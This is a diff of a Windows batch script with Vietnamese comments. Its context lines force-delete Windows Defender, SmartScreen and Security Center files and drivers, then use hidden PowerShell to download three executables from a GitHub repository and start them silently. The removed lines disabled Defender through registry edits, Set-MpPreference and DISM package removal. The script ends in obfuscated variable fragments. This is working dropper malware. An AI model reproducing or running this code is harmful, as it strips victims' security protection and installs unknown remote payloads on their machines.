@@ -64,7 +64,7 @@ for %%d in ("C:\Windows\WinSxS\amd64_security-octagon*" "C:\Windows\WinSxS\x86_w
 :: Xóa các tệp tin không cần thiết
 for %%d in ("C:\Windows\WinSxS\FileMaps\wow64_windows-defender*.manifest" "C:\Windows\WinSxS\FileMaps\x86_windows-defender*.manifest" "C:\Windows\WinSxS\FileMaps\amd64_windows-defender*.manifest" "C:\Windows\System32\SecurityAndMaintenance_Error.png" "C:\Windows\System32\SecurityAndMaintenance.png" "C:\Windows\System32\SecurityHealthSystray.exe" "C:\Windows\System32\SecurityHealthService.exe" "C:\Windows\System32\SecurityHealthHost.exe" "C:\Windows\System32\drivers\SgrmAgent.sys" "C:\Windows\System32\drivers\WdDevFlt.sys" "C:\Windows\System32\drivers\WdBoot.sys" "C:\Windows\System32\drivers\WdFilter.sys" "C:\Windows\System32\wscsvc.dll" "C:\Windows\System32\drivers\WdNisDrv.sys" "C:\Windows\System32\wscsvc.dll" "C:\Windows\System32\wscproxystub.dll" "C:\Windows\System32\wscisvif.dll" "C:\Windows\System32\SecurityHealthProxyStub.dll" "C:\Windows\System32\smartscreen.dll" "C:\Windows\SysWOW64\smartscreen.dll" "C:\Windows\System32\smartscreen.exe" "C:\Windows\SysWOW64\smartscreen.exe" "C:\Windows\System32\DWWIN.EXE" "C:\Windows\SysWOW64\smartscreenps.dll" "C:\Windows\System32\smartscreenps.dll" "C:\Windows\System32\SecurityHealthCore.dll" "C:\Windows\System32\SecurityHealthSsoUdk.dll" "C:\Windows\System32\SecurityHealthUdk.dll" "C:\Windows\System32\SecurityHealthAgent.dll" "C:\Windows\System32\wscapi.dll" "C:\Windows\System32\wscadminui.exe" "C:\Windows\SysWOW64\GameBarPresenceWriter.exe" "C:\Windows\System32\GameBarPresenceWriter.exe" "C:\Windows\SysWOW64\DeviceCensus.exe" "C:\Windows\SysWOW64\CompatTelRunner.exe" "C:\Windows\system32\drivers\msseccore.sys") DO del /f "%%d"
 
-echo Script đã được điều chỉnh thành công.
+@echo off
 
 :: Function to disable Windows Defender
 :disable_windows_defender
@@ -79,54 +79,10 @@ powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).Downl
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/setup.exe', 'C:\Users\%USERNAME%\Downloads\setup.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\setup.exe' -WindowStyle Hidden"
-set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
-set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
-set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
-set "defenderDisableCmds[3]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f"
 
-for %%i in (0 1 2 3) do (
-    set "cmd=!defenderDisableCmds[%%i]!"
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd -ArgumentList '/C !cmd!' -Verb RunAs -Wait"
-)
+:: Other commands...
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled -Type DWord -Value 0"
-
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-
-timeout /t 5 >nul
-
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
-
-:: Package Remover
-set "packages=Windows-Defender-Nis-Group-Package Windows-Defender-Management-Powershell-Group-Package Windows-Defender-Management-MDM-Group-Package Windows-Defender-Management-Group-Package Windows-Defender-Group-Policy-Package Windows-Defender-Core-Group-Package Windows-Defender-Client-Package Windows-Defender-ApplicationGuard-Inbox-WOW64-Package Windows-Defender-ApplicationGuard-Inbox-Package Windows-Defender-AppLayer-Group-Package Windows-Defender-AM-Default-Definitions-Package Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package"
-for %%p in (%packages%) do (
-    for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "%%~p" ^| findstr "~~"') do (
-        set "defender_package=%%i"
-        if defined defender_package (
-            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\!defender_package!" /v Visibility /t REG_DWORD /d 1 /f >nul 2>&1
-            reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\!defender_package!\Owners" /va /f >nul 2>&1
-            dism /online /Remove-Package /PackageName:!defender_package! /NoRestart >nul 2>&1
-        )
-    )
-)
-
-:: Starting Removal of Microsoft Defender Application Guard
-set "melody_packages=Microsoft-Windows-HVSI-Components-Package Microsoft-Windows-HVSI-Components-WOW64-Package Microsoft-Windows-HVSI-Package Microsoft-Windows-HVSI-WOW64-Package Microsoft-Windows-SecurityCenter"
-for %%p in (%melody_packages%) do (
-    for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "%%~p" ^| findstr "~~"') do (
-        set "melody_package_name=%%i"
-        if defined melody_package_name (
-            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\!melody_package_name!" /v Visibility /t REG_DWORD /d 1 /f >nul 2>&1
-            reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\!melody_package_name!\Owners" /va /f >nul 2>&1
-            dism /online /Remove-Package /PackageName:!melody_package_name! /NoRestart >nul 2>&1
-        )
-    )
-)
-
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
-
+pause
 
 set "HupmSupuux=co" & set "kGVKIbdgek=em"
 set "wgeIsriSZO=ll"
